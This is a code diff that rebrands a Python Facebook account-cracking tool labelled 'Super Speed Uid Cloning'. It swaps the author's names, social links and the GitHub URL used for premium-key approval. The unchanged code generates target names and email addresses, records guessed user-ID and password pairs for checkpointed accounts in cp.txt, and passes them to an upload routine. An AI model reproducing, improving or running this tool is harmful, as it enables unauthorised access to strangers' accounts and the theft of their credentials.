@@ -41,8 +41,8 @@ def runtxt(z):
 
 def helpnote():
 	print("%s [*] FOLLOW ME ON Fb TU KNOW ABOUT UPDATES  :)"%(G))
-	subprocess.check_output(["am", "start", "https://github.com/Mdfaijul01/Fuck.txt/blob/main/Fuck.txt"])
-	exit(" [*] FACEBOOK :  MD FAIJUL")
+	subprocess.check_output(["am", "start", "https://github.com/itzalif007/itzalif007/blob/Ahameed7/001.txt"])
+	exit(" [*] FACEBOOK :  DUDE ")
 
 
 def notice():
@@ -51,8 +51,8 @@ def notice():
 
 	runtxt("\n\033[0;91mYOU ARE NOT PREMIUM USER ")
 	runtxt("\033[0;93m  SENT THIS KEY TO ADMIN >> %s%s"%(G,basesplit))
-	runtxt("\033[0;92m ADMIN MESSENGER🔰FAIJUL")
-	subprocess.check_output(["am", "start", "https://www.facebook.com/digon.sarkar"])
+	runtxt("\033[0;92m ADMIN MESSENGER🌿DUDE ")
+	subprocess.check_output(["am", "start", "https://www.facebook.com/ag420gamingyt"])
 
 def irfan():
 	
@@ -78,7 +78,7 @@ class Main:
 		self.cp = []
 		self.loop = 0
 		try:
-			plr = requests.get('https://github.com/Mdfaijul01/Approval/blob/main/fuck.txt').text
+			plr = requests.get('https://github.com/itzalif007/itzalif007/blob/Ahameed7/001.txt').text
 			if basesplit in plr:
 				key = basesplit
 				stat = ("\033[0;92mPREMIUM")
@@ -108,10 +108,10 @@ class Main:
 888   "   888  d8888888888 888        Y88b  d88P 
 888       888 d88P     888 88888888    "Y8888P" 
 \033[1;90m══════════════════════════════════════════════════
-\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : MD FAIJUL  
+\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : DuDe  
 \033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : NONE 
-\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : Mdfaijul01
-\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : 01846201363
+\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : itzalif007
+\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : GTA SQUAD
 \033[1;90m══════════════════════════════════════════════════
     """)
 		print("%s [%s•%s] %sTOOL NAME : %sSuper Speed Uid Cloning"%(G,R,G,B,G))
@@ -401,7 +401,7 @@ class Main:
 	def email(self):
 		x = 111
 		xx = 999
-		nam = input("%s [?] TYPE A NAME %s(EX: Riyad): "%(Y,G))
+		nam = input("%s [?] TYPE A NAME %s(EX: Shohag): "%(Y,G))
 		nam = nam.replace(" ", "")
 		print("%s EXAMPLE  : %s@gmail.com, @yahoo.com, @hotmail.com ETC"%(Y,G))
 		idx = input("%s DOMAIN  : "%(B))
@@ -463,9 +463,9 @@ class Main:
 				uploadoks()
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;91m[FAIJUL-CP] %s|%s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;91m[DUDE-CP] %s|%s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("cp.txt","a").write(" [FAIJUL-CP] %s|%s\n"%(uid, pw))
+				open("cp.txt","a").write(" [DUDE-CP] %s|%s\n"%(uid, pw))
 				uploadcps()
 				break
 			else:
